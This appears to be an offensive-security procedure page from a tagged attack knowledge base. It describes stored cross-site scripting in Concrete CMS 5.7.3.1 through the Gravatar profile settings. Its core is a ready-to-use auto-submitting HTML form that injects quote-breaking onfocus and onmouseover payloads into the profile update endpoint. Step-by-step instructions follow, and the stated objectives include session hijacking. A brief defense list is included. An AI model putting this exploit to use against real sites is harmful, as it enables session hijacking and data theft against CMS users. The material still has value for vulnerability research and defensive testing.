---
tags:
  - xss
  - stored-xss
  - profile-update
  - gravatar
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/update-profile-with-xss-in-gravatar-params]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.403Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 156699de-602f-480b-9bde-cdd42e01c60c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored-XSS-via-Profile-Update-in-Concrete-CMS

## Summary

This procedure targets stored XSS in Concrete CMS 5.7.3.1 profile options by injecting event-handler payloads into gravatar_max_level and gravatar_image_set POST parameters during updates at /index.php/dashboard/system/registration/profiles/update_profiles, triggering JavaScript on focus and mouseover events in profile views.

## Description

User inputs for Gravatar settings are stored unencoded and output in HTML without validation, allowing breakout from attribute contexts to inject onfocus and onmouseover handlers. This executes when users interact with profile elements, enabling data theft or actions. Requires authentication but affects the updating user and potentially others viewing profiles.

## Requirements

1. Authenticated session to the dashboard
2. Access to profile update endpoint
3. Web browser for form submission

## Defense

Defensive measures and detection strategies:

- Encode all outputs with context-aware escaping (e.g., for attributes)
- Sanitize Gravatar-related inputs to alphanumeric only
- Log and alert on profile updates with script-like content
- Deploy CSP to restrict event handler execution

## Objectives

1. Persist event-based XSS in profile settings
2. Trigger scripts via user interactions for session hijacking
3. Impact profile management workflows

## Instructions

### Step 1: Access Profile Update Form

**Context**: Log in and navigate to dashboard profile options.

Go to /index.php/dashboard/system/registration/profiles/update_profiles.

### Step 2: Submit Malicious Payloads

**Context**: Inject payloads that escape quotes and add event attributes.

**Command** ([[commands/update-profile-with-xss-in-gravatar-params]]):
```html
<html>
<body>
<form method="POST" action="http://[host]/concrete5/index.php/dashboard/system/registration/profiles/update_profiles">
<input type="hidden" name="public_profiles" value="1">
<input type="hidden" name="gravatar_fallback" value='1'>
<input type="hidden" name="gravatar_max_level" value='" autofocus onfocus="alert(1)'>
<input type="hidden" name="gravatar_image_set" value='" onmouseover="alert(2)'>
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

> Auto-submits with payloads; replace [host].

### Step 3: Trigger and Verify

**Context**: Interact with updated profile elements.

Focus on or hover over Gravatar options.

**Expected Output**: Alerts (1 and 2) confirm execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/update-profile-with-xss-in-gravatar-params]]

## Tools Used


## Tags

- xss
- stored-xss
- concrete-cms
